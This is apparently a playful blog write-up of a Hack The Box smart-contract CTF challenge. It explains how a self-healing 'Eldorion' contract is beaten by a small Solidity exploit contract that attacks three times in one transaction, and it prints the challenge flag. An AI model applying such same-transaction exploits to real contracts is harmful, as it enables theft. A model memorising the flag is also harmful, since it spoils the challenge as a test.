---
title: hacqueen-vs-eldorion
date: 2025-03-26
description: A glitter-fueled showdown between Hacqueen and a self-healing smart contract beast. Spoiler: the unicorn never miss.
tags: ["Blockchain", "Smart Contract", "CTF", "HTB"]
---

# 🌈✨ Hacqueen vs Eldorion: Bytes, Bravery & a Battle Unicorn ✨🌈

![Hacqueen vs Eldorion](/mnt/data/A_vibrant_digital_illustration_with_elements_of_fa.png)

This HTB challenge was pure drama: a pixel-perfect realm, an overpowered regenerating beast, and one fabulous hacker armed with Web3, glitter, and Python.

> *Welcome to the realms of Eldoria, adventurer. You’ve found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you. But your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face Eldorion, a colossal beast with terrifying regenerative powers. This creature, known for its "eternal resilience" guards the only passage forward. It's clear: you must defeat Eldorion to continue your quest.*

🎯 **Goal**: Defeat Eldorion — a smart contract boss that heals every time a new block is mined.

Sounds impossible? Not for Hacqueen. Let’s ride. 🦄💻

---

## 🔍 Contract Breakdown

```solidity
modifier eternalResilience() {
    if (block.timestamp > lastAttackTimestamp) {
        health = MAX_HEALTH;
        lastAttackTimestamp = block.timestamp;
    }
    _;
}
```

Eldorion has 300 HP. Each attack can only do 100 damage. And it resets health every new block.  
🧠 So we need **three hits in one transaction**.

---

## 🛠️ The Exploit

```solidity
contract Slayer {
    IEldorion public target;

    constructor(address _target) {
        target = IEldorion(_target);
    }

    function slay() external {
        target.attack(100);
        target.attack(100);
        target.attack(100);
    }
}
```

Wrapped into a Python script using Web3.py + solcx, we deploy this contract and call `slay()`.

---

## 🧪 Result

Flag in hand, beast on the floor:

```
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```

---

## 🦄 Final Glitterprint

✨ One block.  
💥 Three hits.  
👑 All slay, no delay.

Because when Hacqueen and her unicorn ride in... bugs get patched and beasts get rekt.
